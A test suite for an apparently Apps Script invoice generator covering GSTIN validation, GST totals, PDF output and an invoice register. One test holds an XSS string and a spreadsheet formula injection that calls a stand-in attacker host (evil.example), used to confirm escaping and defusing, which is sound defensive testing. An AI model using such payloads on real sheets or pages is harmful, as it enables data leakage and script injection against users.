'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { createApp } = require('./gas-harness');

// A GSTIN with a correct check character, built independently of the app's code.
const CHARS = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
function gstin(base14) {
  let sum = 0;
  base14.split('').forEach((c, i) => {
    const p = CHARS.indexOf(c) * (i % 2 === 0 ? 1 : 2);
    sum += Math.floor(p / 36) + (p % 36);
  });
  return base14 + CHARS[(36 - (sum % 36)) % 36];
}
const WB_GSTIN = gstin('19AAAAA0000A1Z'); // West Bengal
const KA_GSTIN = gstin('29BBBBB1111B1Z'); // Karnataka

function lib() {
  return createApp().eval('invoiceLib_()');
}

function form(overrides) {
  return Object.assign({
    clientName: 'Acme Robotics Pvt Ltd',
    clientAddress: '4 Industrial Area, Bengaluru, Karnataka 560001',
    clientGstin: KA_GSTIN,
    clientEmail: '',
    invoiceDate: '2026-10-29',
    dueDays: '15',
    currency: 'INR',
    taxMode: 'inter',
    gstRate: '18',
    notes: '',
    paymentMethod: 'Wire Transfer',
    amountPaid: '',
    items: [{ name: 'Image annotation', description: 'Bounding boxes', quantity: '1000', rate: '2.50', unit: 'Images' }],
  }, overrides);
}

function readyApp(config) {
  const app = createApp();
  app.eval("CONFIG.COMPANY_GSTIN = '" + WB_GSTIN + "'");
  (config || []).forEach((line) => app.eval(line));
  app.call('setup');
  return app;
}

function pdfsIn(app) {
  return app.filesIn('ROOT_FOLDER_ID').filter((f) => /\.pdf$/.test(f.name));
}

function rowFor(app, number) {
  const rows = app.sheetRows();
  const header = rows[0];
  const row = rows.find((r) => r[header.indexOf('Invoice No')] === number);
  return row && Object.fromEntries(header.map((name, i) => [name, row[i]]));
}

test('GSTIN check character catches typos', () => {
  const l = createApp().context.invoiceLib_();
  assert.equal(l.gstinValid(WB_GSTIN), true);
  assert.equal(l.gstinValid(WB_GSTIN.slice(0, 14) + (WB_GSTIN[14] === 'A' ? 'B' : 'A')), false);
  assert.equal(l.gstinValid('27AAPFU0939F1ZV'), true); // widely published sample
  assert.equal(l.gstinValid('99AAAAA0000A1Z5'), false);
});

test('totals: intra-state splits GST, rupee invoices are rounded to the rupee', () => {
  const l = createApp().context.invoiceLib_();
  const t = l.computeTotals([{ quantity: 3, rateMinor: 3333 }], 'intra', 18, 'INR'); // 99.99
  assert.equal(t.subtotal, 9999);
  assert.equal(t.tax, 1800); // 17.9982 -> 18.00
  assert.equal(t.cgst + t.sgst, t.tax);
  assert.equal(t.total % 100, 0);
  assert.equal(t.subtotal + t.tax + t.roundOff, t.total);
  const usd = l.computeTotals([{ quantity: 3, rateMinor: 3333 }], 'none', 18, 'USD');
  assert.equal(usd.tax, 0);
  assert.equal(usd.total, 9999);
});

test('amounts in words use lakh/crore for INR and millions for USD', () => {
  const l = createApp().context.invoiceLib_();
  assert.equal(l.amountInWords(118000, 'INR'), 'Indian Rupees One Thousand One Hundred Eighty Only');
  assert.equal(l.amountInWords(12345678900, 'INR'), 'Indian Rupees Twelve Crore Thirty-Four Lakh Fifty-Six Thousand Seven Hundred Eighty-Nine Only');
  assert.equal(l.amountInWords(10050, 'INR'), 'Indian Rupees One Hundred and Fifty Paise Only');
  assert.equal(l.amountInWords(0, 'INR'), 'Indian Rupees Zero Only');
  assert.equal(l.amountInWords(250000000, 'USD'), 'US Dollars Two Million Five Hundred Thousand Only');
  assert.equal(l.formatMoney(123456789, 'INR'), '12,34,567.89');
  assert.equal(l.formatMoney(123456789, 'USD'), '1,234,567.89');
});

test('dates and quantities print in the configured style', () => {
  const l = createApp().context.invoiceLib_();
  assert.equal(l.displayDate('2026-09-01', 'MM/DD/YYYY'), '09/01/2026');
  assert.equal(l.displayDate('2026-09-01', 'DD/MM/YYYY'), '01/09/2026');
  assert.equal(l.displayDate('2026-10-29'), '29 Oct 2026');
  assert.equal(l.addDays('2026-12-25', 15), '2027-01-09');
  assert.equal(l.parseIsoDate('2026-02-30'), null);
  assert.equal(l.formatQuantity(5140, 'USD'), '5,140.00');
  assert.equal(l.formatQuantity(12.5, 'INR'), '12.50');
  assert.equal(l.formatQuantity(0.125, 'USD'), '0.125');
});

test('validation rejects bad input field by field', () => {
  const l = createApp().context.invoiceLib_();
  const bad = l.validateInvoice(form({
    clientName: 'A', clientGstin: '29BBBBB1111B1Z0', invoiceDate: '29/10/2026', dueDays: '400', currency: 'EUR', gstRate: '-1',
    items: [{ name: 'x', quantity: '0', rate: '1.234' }],
  }), WB_GSTIN);
  assert.equal(bad.ok, false);
  ['clientName', 'clientGstin', 'invoiceDate', 'dueDays', 'currency', 'gstRate', 'items'].forEach((f) => assert.ok(bad.errors[f], f));
  assert.deepEqual(Object.keys(bad.itemErrors[0]).sort(), ['name', 'quantity', 'rate']);
  assert.equal(l.validateInvoice(form({ items: [] }), WB_GSTIN).ok, false);
});

test('GST type must match the client state, and needs a company GSTIN', () => {
  const l = createApp().context.invoiceLib_();
  assert.ok(l.validateInvoice(form({ taxMode: 'intra' }), WB_GSTIN).errors.taxMode);
  assert.ok(l.validateInvoice(form({ clientGstin: WB_GSTIN, taxMode: 'inter' }), WB_GSTIN).errors.taxMode);
  assert.equal(l.validateInvoice(form({ clientGstin: WB_GSTIN, taxMode: 'intra' }), WB_GSTIN).ok, true);
  assert.ok(l.validateInvoice(form(), '').errors.taxMode);
  assert.equal(l.validateInvoice(form({ taxMode: 'none' }), '').ok, true);
});

test('generateInvoice files a numbered PDF, logs it, and returns the download', () => {
  const app = readyApp();
  const r = app.call('generateInvoice', form({ amountPaid: '450' }));
  assert.equal(r.success, true, JSON.stringify(r));
  assert.equal(r.number, '10');
  assert.equal(r.total, '2,950.00'); // 2500 + 450 IGST
  const pdf = Buffer.from(r.pdfBase64, 'base64').toString('utf8');
  assert.ok(pdf.startsWith('%PDF'));
  assert.match(pdf, /<h1>Invoice 10<\/h1>/);
  assert.match(pdf, /IGST @ 18%/);
  assert.match(pdf, /Acme Robotics Pvt Ltd/);
  assert.match(pdf, /Payment Method:/);
  assert.match(pdf, /Rs\. 450\.00/); // paid
  assert.match(pdf, /Rs\. 2,500\.00/); // balance
  assert.equal(pdfsIn(app).length, 1);
  assert.match(pdfsIn(app)[0].name, /^Invoice 10 - Acme Robotics/);

  const row = rowFor(app, r.number);
  assert.equal(row.Client, 'Acme Robotics Pvt Ltd');
  assert.equal(row.Total, '2,950.00');
  assert.equal(row.Paid, '450.00');
  assert.equal(row.Balance, '2,500.00');
  assert.equal(row['Due Date'], '2026-11-13');
  assert.equal(row.Status, 'Issued');
});

test('the layout matches the reference invoice: USD, item rows with units, paid and balance', () => {
  const app = readyApp();
  const r = app.call('generateInvoice', form({
    currency: 'USD', taxMode: 'none', clientGstin: '', clientPhone: '+1 (773) 844-6649',
    clientAddress: '399 Fremont Street\nSan Francisco CA 94105\nUnited States',
    invoiceDate: '2026-09-01', dueDays: '30',
    items: [
      { name: 'Monthly Salary', description: 'For Managing and Recruiting Manpower 24/7.', quantity: '1', rate: '450', unit: 'Unit' },
      { name: 'Video Review Hour', description: 'Qrambo tool video reviewing.', quantity: '5140', rate: '0.70', unit: 'Hours' },
    ],
  }));
  assert.equal(r.success, true, JSON.stringify(r));
  const pdf = Buffer.from(r.pdfBase64, 'base64').toString('utf8');
  assert.match(pdf, /Invoice Date:<\/td><td class="v">09\/01\/2026/);
  assert.match(pdf, /Due Date:<\/td><td class="v">10\/01\/2026/);
  assert.match(pdf, /5,140\.00<span class="unit">Hours/);
  assert.match(pdf, /\$3,598\.00/);
  assert.match(pdf, /\$4,048\.00/); // subtotal = total = balance
  assert.match(pdf, /<p>San Francisco CA 94105<\/p>/);
  assert.match(pdf, /P: \+1 \(773\) 844-6649/);
  assert.doesNotMatch(pdf, /GST @|IGST|CGST|Amount in words/);
});

test('numbers are sequential from FIRST_NUMBER, across dates', () => {
  const app = readyApp();
  const n = (date) => app.call('generateInvoice', form({ invoiceDate: date })).number;
  assert.equal(n('2026-10-01'), '10');
  assert.equal(n('2026-10-02'), '11');
  assert.equal(n('2027-04-01'), '12');
  app.eval("CONFIG.NUMBER_PREFIX = 'TAI-'");
  assert.equal(n('2027-04-02'), 'TAI-13');
});

test('amount paid is checked against the total; a fully paid invoice is marked Paid', () => {
  const app = readyApp();
  const over = app.call('generateInvoice', form({ amountPaid: '2950.01' }));
  assert.equal(over.success, false);
  assert.ok(over.errors.amountPaid);
  const r = app.call('generateInvoice', form({ amountPaid: '2950' }));
  assert.equal(r.success, true);
  assert.equal(rowFor(app, r.number).Status, 'Paid');
  assert.equal(rowFor(app, r.number).Balance, '0.00');
});

test('invoices without company GSTIN are plain invoices', () => {
  const app = createApp();
  app.call('setup');
  const r = app.call('generateInvoice', form({ taxMode: 'none', clientGstin: '' }));
  assert.equal(r.success, true, JSON.stringify(r));
  const pdf = Buffer.from(r.pdfBase64, 'base64').toString('utf8');
  assert.doesNotMatch(pdf, /GST @|IGST|CGST/);
});

test('client text is HTML-escaped and formulas are defused in the register', () => {
  const app = readyApp();
  const r = app.call('generateInvoice', form({
    clientName: '<script>alert(1)</script> & Co',
    clientAddress: '=IMPORTXML("http://evil.example","//a") 12 Road, Kolkata',
  }));
  assert.equal(r.success, true, JSON.stringify(r));
  const pdf = Buffer.from(r.pdfBase64, 'base64').toString('utf8');
  assert.doesNotMatch(pdf, /<script>alert/);
  assert.match(pdf, /&lt;script&gt;alert\(1\)&lt;\/script&gt; &amp; Co/);
  assert.equal(app.sheetRows()[1][app.sheetRows()[0].indexOf('Client Address')].startsWith("'"), true);
});

test('access code blocks issuing when set', () => {
  const app = readyApp(["CONFIG.ACCESS_CODE = 's3cret'"]);
  const denied = app.call('generateInvoice', form());
  assert.equal(denied.success, false);
  assert.equal(denied.accessCodeInvalid, true);
  assert.equal(app.sheetRows().length, 1); // header only
  assert.equal(app.call('generateInvoice', form({ accessCode: 's3cret' })).success, true);
});

test('emails the client only when asked and an address is given', () => {
  const app = readyApp();
  assert.equal(app.call('generateInvoice', form({ clientEmail: 'ap@acme.example' })).emailed, false);
  const r = app.call('generateInvoice', form({ clientEmail: 'ap@acme.example', emailClient: true }));
  assert.equal(r.emailed, true);
  assert.equal(app.mail.length, 1);
  assert.equal(app.mail[0].to, 'ap@acme.example');
  assert.match(app.mail[0].subject, /Invoice 11 /);
});

test('invalid submissions are rejected before anything is filed', () => {
  const app = readyApp();
  const r = app.call('generateInvoice', form({ clientName: '' }));
  assert.equal(r.success, false);
  assert.ok(r.errors.clientName);
  assert.equal(pdfsIn(app).length, 0);
  assert.equal(app.call('generateInvoice', form()).number, '10'); // no number burned
});

test('the portal page renders with the shared rules inlined', () => {
  const app = readyApp();
  const page = app.eval("HtmlService.createTemplateFromFile('Index').evaluate().getContent()");
  assert.match(page, /gstinValid/);
  assert.match(page, /generateInvoice/);
  assert.doesNotMatch(page, /id="accessCode"/);
  assert.match(app.eval("doGet().xFrameOptionsMode"), /ALLOWALL/);
  app.eval("CONFIG.ACCESS_CODE = 'x'");
  assert.match(app.eval("HtmlService.createTemplateFromFile('Index').evaluate().getContent()"), /id="accessCode"/);
});

test('previewInvoice saves a sample PDF', () => {
  const app = readyApp();
  app.call('previewInvoice');
  assert.equal(pdfsIn(app).length, 1);
  assert.match(pdfsIn(app)[0].name, /^PREVIEW/);
});

test('a register from an earlier version gets the missing columns added', () => {
  const app = readyApp();
  const rows = app.sheetRows();
  rows[0] = rows[0].filter((h) => h !== 'Paid' && h !== 'Balance'); // as the first release made it
  const r = app.call('generateInvoice', form({ amountPaid: '100' }));
  assert.equal(r.success, true, JSON.stringify(r));
  const row = rowFor(app, r.number);
  assert.equal(row.Paid, '100.00');
  assert.equal(row.Balance, '2,850.00');
  assert.equal(row.Client, 'Acme Robotics Pvt Ltd');
});
